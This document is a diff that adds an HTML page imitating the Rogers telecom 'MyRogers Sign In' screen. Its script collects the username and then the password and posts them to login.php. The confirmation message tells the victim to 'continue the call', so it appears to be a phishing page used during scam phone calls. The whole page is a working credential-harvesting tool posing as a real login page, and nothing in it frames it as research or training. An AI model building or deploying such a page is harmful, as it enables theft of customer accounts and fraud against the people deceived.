@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MyRogers Sign In</title>
+    <link rel="stylesheet" href="style.css" />
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    
+  </head>
+  <body>
+    <div class="login-container">
+      <div class="login-box">
+        <img src="logo.png" alt="Rogers Logo" class="logo" />
+        <h2>Sign in</h2>
+
+
+
+        <p>with your MyRogers credentials</p>
+        <form id="login-form">
+          <input type="text" id="username" placeholder="Username" required />
+          <input
+            type="password"
+            id="password"
+            placeholder="Password"
+            name="password"
+            style="display: none"
+          />
+          <a href="#" class="forgot-username">Forgot username?</a>
+          <div>
+            <input type="checkbox" id="remember-username" />
+            <label for="remember-username">Remember username</label>
+          </div>
+          <button type="submit" name="submit" id="login-button">Login</button>
+        </form>
+        <p id="error-message" style="color: red; display: none">
+          Both fields are required.
+        </p>
+        <p id="response-message" style="color: green; display: none"></p>
+        <hr />
+        <strong
+          >New to MyRogers?
+          <a href="#" class="register-link">Register</a></strong
+        >
+      </div>
+    </div>
+
+
+
+    <div id="myModal" class="modal">
+      <div class="modal-content">
+        <p>Your details have been submitted successfully. Please continue the call.</p>
+          <button type="button" class="close">Close</button>
+      </div>
+  </div>
+
+
+
+    
+  </body>
+</html>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+<script>
+var modal = document.getElementById("myModal");
+var span = document.getElementsByClassName("close")[0];
+
+span.onclick = function() {
+    modal.style.display = "none";
+}
+
+window.onclick = function(event) {
+    if (event.target == modal) {
+        modal.style.display = "none";
+    }
+}
+
+$(document).ready(function () {
+    var usernameCaptured = false;
+
+    $("#login-form").on("submit", function (event) {
+      event.preventDefault(); // Prevent the default form submission
+
+      if (!usernameCaptured) {
+        var username = $("#username").val().trim();
+        if (username === "") {
+          $("#error-message").text("Username is required.").show();
+          return;
+        }
+        $("#username").hide();
+        $("#password").show().focus();
+        usernameCaptured = true;
+      } else {
+        var password = $("#password").val().trim();
+        var username = $("#username").val().trim();
+
+        if (username === "" || password === "") {
+          $("#error-message").text("Both fields are required.").show();
+          return;
+        }
+        $("#error-message").hide();
+
+        $.ajax({
+          type: "POST",
+          url: "login.php",
+          data: {
+            username: username,
+            password: password,
+          },
+          success: function (response) {
+
+            modal.style.display = "block";
+
+            $("#response-message")
+              .text("Your details have been submitted successfully. Please continue the call. ")
+              .show();
+          },
+          error: function (xhr, status, error) {
+            $("#error-message").text("Login failed: " + error).show();
+          }
+        });
+      }
+    });
+  });
+</script>
